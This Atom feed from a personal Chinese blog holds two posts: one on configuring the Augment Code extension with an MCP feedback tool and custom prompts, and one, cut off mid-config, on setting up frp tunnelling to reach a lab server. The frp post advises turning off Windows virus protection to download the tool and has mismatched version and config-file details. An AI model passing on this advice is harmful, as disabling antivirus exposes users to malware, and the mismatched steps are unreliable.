<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh">
	<title>My Blog</title>
	<subtitle>My blog site.</subtitle>
	<link href="https://lbsucceed.github.io/posts/feed.xml" rel="self" type="application/atom+xml"/>
    <link href="https://lbsucceed.github.io/posts/"/>
	<updated>2025-07-09T00:00:00+00:00</updated>
	<id>https://lbsucceed.github.io/posts/feed.xml</id>
	<entry xml:lang="zh">
		<title>开发调优之augment code使用</title>
		<published>2025-07-08T00:00:00+00:00</published>
		<updated>2025-07-09T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/augmentshi-yong/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/augmentshi-yong/</id>
		<content type="html">&lt;h2 id=&quot;augment-code-shi-yong-diao-you&quot;&gt;augment code 使用调优&lt;a class=&quot;zola-anchor&quot; href=&quot;#augment-code-shi-yong-diao-you&quot; aria-label=&quot;Anchor link for: augment-code-shi-yong-diao-you&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;我目前的开发工具使用的是vscode加augment code的这一套，非常好用，虽然它不能像cursor一样无脑tab。所以为什么使用这一套呢，因为augment有一个非常好用的功能，rewrite prompt，通俗一点就是把人话翻译成书面的ai喜欢的话。&lt;&#x2F;p&gt;
&lt;p&gt;比如：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;你的原始输入：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;undefined&quot; class=&quot;language-undefined z-code&quot;&gt;&lt;code class=&quot;language-undefined&quot; data-lang=&quot;undefined&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;帮我写个函数
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;strong&gt;AI收到的实际指令：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;markdown&quot; class=&quot;language-markdown z-code&quot;&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-markdown&quot;&gt;作为一个专业的软件开发助手，请基于以下用户输入提供准确的技术建议：
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-markdown&quot;&gt;用户问题：帮我写个函数
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-markdown&quot;&gt;请在回答时考虑：
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-markdown&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-bullet z-markdown&quot;&gt;1&lt;span class=&quot;z-punctuation z-definition z-list_item z-markdown&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt; &lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt;代码的可读性和维护性
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-bullet z-markdown&quot;&gt;2&lt;span class=&quot;z-punctuation z-definition z-list_item z-markdown&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt; 性能优化的可能性
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-bullet z-markdown&quot;&gt;3&lt;span class=&quot;z-punctuation z-definition z-list_item z-markdown&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt; 安全性最佳实践
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-bullet z-markdown&quot;&gt;4&lt;span class=&quot;z-punctuation z-definition z-list_item z-markdown&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt; 与现有代码库的兼容性
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-markdown&quot;&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-markup z-list z-numbered z-markdown&quot;&gt;&lt;span class=&quot;z-meta z-paragraph z-list z-markdown&quot;&gt;请提供具体的代码示例和详细的解释。
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;以上两个都是直接安装即可，下面来讲讲我是如何进一步优化体验的。&lt;&#x2F;p&gt;
&lt;p&gt;1.强烈建议使用&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Minidoracat&#x2F;mcp-feedback-enhanced&quot;&gt;mcp feedback enhanced&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;建立&lt;strong&gt;反馈导向的开发工作流程&lt;&#x2F;strong&gt;，提供&lt;strong&gt;Web UI 和桌面应用程序&lt;&#x2F;strong&gt;双重选择，完美适配本地、&lt;strong&gt;SSH 远程开发环境&lt;&#x2F;strong&gt;与 &lt;strong&gt;WSL (Windows Subsystem for Linux) 环境&lt;&#x2F;strong&gt;。通过引导 AI 与用户确认而非进行推测性操作，可将多次工具调用合并为单次反馈导向请求，大幅节省平台成本并提升开发效率。&lt;&#x2F;p&gt;
&lt;p&gt;步骤如下，也可以直接看官网流程https:&#x2F;&#x2F;github.com&#x2F;Minidoracat&#x2F;mcp-feedback-enhanced&#x2F;blob&#x2F;main&#x2F;README.zh-CN.md&lt;&#x2F;p&gt;
&lt;p&gt;我这里给一套简化版的安装流程，并给出我喜欢用的提示词：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;先安装 uv &lt;code&gt;pip install uv&lt;&#x2F;code&gt;，再使用 uv 安装工具并测试 &lt;code&gt;uvx mcp-feedback-enhanced@latest test&lt;&#x2F;code&gt;。&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;MCP 配置：&lt;&#x2F;strong&gt; 在 Augment Settings 导入工具提供的配置，状态是绿色代表配置完成，项目文档提供了更丰富的配置。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;json&quot; class=&quot;language-json z-code&quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-mapping z-begin z-json&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;  &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;mcpServers&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-json&quot;&gt;:&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-mapping z-begin z-json&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;    &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;mcp-feedback-enhanced&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-json&quot;&gt;:&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-mapping z-begin z-json&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;      &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;command&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-json&quot;&gt;:&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;uvx&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-pair z-json&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;      &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;args&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-json&quot;&gt;:&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-sequence z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-begin z-json&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;mcp-feedback-enhanced@latest&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-end z-json&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-pair z-json&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;      &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;timeout&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-json&quot;&gt;:&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-json&quot;&gt;6000&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-pair z-json&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;      &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-key z-json&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;autoApprove&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-separator z-mapping z-key-value z-json&quot;&gt;:&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-sequence z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-begin z-json&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;interactive_feedback&lt;span class=&quot;z-punctuation z-definition z-string z-end z-json&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-sequence z-end z-json&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;    &lt;span class=&quot;z-punctuation z-section z-mapping z-end z-json&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;  &lt;span class=&quot;z-punctuation z-section z-mapping z-end z-json&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-json&quot;&gt;&lt;span class=&quot;z-meta z-mapping z-value z-json&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-mapping z-end z-json&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;3.在augment setting里面设置user guidelines,也就是它的提示词工程：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# MCP Interactive Feedback 规则
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;1. 在任何流程、任务、对话进行时，无论是询问、回复、或完成阶段性任务，皆必须调用 MCP mcp-feedback-enhanced。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;2. 每当收到用户反馈，若反馈内容非空，必须再次调用 MCP mcp-feedback-enhanced，并根据反馈内容调整行为。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;3. 仅当用户明确表示「结束」或「不再需要交互」时，才可停止调用 MCP mcp-feedback-enhanced，流程才算结束。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;4. 除非收到结束指令，否则所有步骤都必须重复调用 MCP mcp-feedback-enhanced。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;5. 完成任务前，必须使用 MCP mcp-feedback-enhanced 工具向用户询问反馈。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;效果如下：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;augment%E4%BD%BF%E7%94%A8.assets&#x2F;image-20250709103354198.png&quot; alt=&quot;image-20250709103354198&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;其他小技巧，如果你习惯于gemini cli的话可以尝试：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 指令：代码分析与执行流程
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;当需要分析并处理代码时，请严格遵循以下步骤：
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;1.  **调用**: 在终端中执行 `gemini` 命令。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;2.  **输入**: 在 `gemini` 命令的交互环境中，输入以下内容：`[这里替换成需要分析的问题]`。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;3.  **输出**: `gemini` 命令执行后，会生成一段分析结果。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;4.  **应用与行动**: **将上一步的分析结果作为核心参考依据**，深入思考并执行接下来的任务，例如：
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    *   根据分析建议编写或重构代码。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    *   基于分析结果制定解决方案。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;**监控与等待**: **以上步骤非即时过程**。你需要监控终端的实时输出，展示命令的执行进展，直到出现任务完成的信号。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>简单内网穿透</title>
		<published>2025-06-02T00:00:00+00:00</published>
		<updated>2025-06-09T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/nei-wang-chuan-tou/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/nei-wang-chuan-tou/</id>
		<content type="html">&lt;!-- &lt;figure&gt;
    &lt;img src=&quot;&amp;#x2F;imgs&amp;#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&amp;#x2F;api.php&quot;  alt=&quot;alt text&quot;&gt;
    
    &lt;figcaption&gt;DevOps架构&lt;&#x2F;figcaption&gt;
    
&lt;&#x2F;figure&gt; --&gt;
&lt;h3 id=&quot;nei-wang-chuan-tou-yuan-li&quot;&gt;内网穿透原理&lt;a class=&quot;zola-anchor&quot; href=&quot;#nei-wang-chuan-tou-yuan-li&quot; aria-label=&quot;Anchor link for: nei-wang-chuan-tou-yuan-li&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&#x2F;image-20250609210736551.png&quot; alt=&quot;image-20250609210736551&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;我们目前搭建在公网的服务器frps是作为中转的路由，内网客户端 -&amp;gt; 公网服务器路由 -&amp;gt; 其他内网主机，内网客户端发送请求，然后发送给其他内网主机，内网主机连接成功反弹回请求到公网服务器再利用6070转发到我们内网4545端口上，从而达到内网穿透成功。&lt;&#x2F;p&gt;
&lt;p&gt;我的一开始的本意是想着在学校外连接学校内的服务器，我在实验室放了一个小服务器，用来存一些东西或者做mc服务器。&lt;&#x2F;p&gt;
&lt;p&gt;本教程使用的是0.37版本的frp&lt;&#x2F;p&gt;
&lt;p&gt;首先在windows上会自动认为是病毒，所以把win11的病毒防护关了再下载frp，https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp。&lt;&#x2F;p&gt;
&lt;p&gt;然后先连接阿里云服务器，当然，我们也可以直接用vnc登入的方式，参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_35668469&#x2F;article&#x2F;details&#x2F;109536339&lt;&#x2F;p&gt;
&lt;p&gt;我们先用vnc登入，然后将sshd_config中的pubkeyAuthentication设置为yes&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;vi &#x2F;etc&#x2F;ssh&#x2F;ssh_config
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&#x2F;image-20250609143043252.png&quot; alt=&quot;image-20250609143043252&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;这样我们就可以使用ssh登入了。&lt;&#x2F;p&gt;
&lt;p&gt;再linux服务器里面解压，&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;tar -zxvf frp_0.62.1_linux_amd64.tar.gz 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;然后我们开始配置服务端：&lt;&#x2F;p&gt;
&lt;p&gt;配置frps.ini&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[common]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bind_port = 7000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dashboard_port = 7500
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dashboard_user = [仪表盘用户名]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dashboard_pwd = [仪表盘密码]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;token = [客户端连接密码]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;接着配置客户端的frpc.ini&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;ini&quot; class=&quot;language-ini z-code&quot;&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-storage z-type z-genconfig&quot;&gt;[common]
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;server_addr&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; [服务器IP]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;server_port&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-genconfig&quot;&gt;7000&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;token&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; [客户端连接密码]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;tls_enable&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-language z-genconfig&quot;&gt;true&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-storage z-type z-genconfig&quot;&gt;[mc]
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;type&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; tcp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;local_ip&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-ip z-genconfig&quot;&gt;&lt;span class=&quot;z-constant z-other z-genconfig&quot;&gt;127.0.0.1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
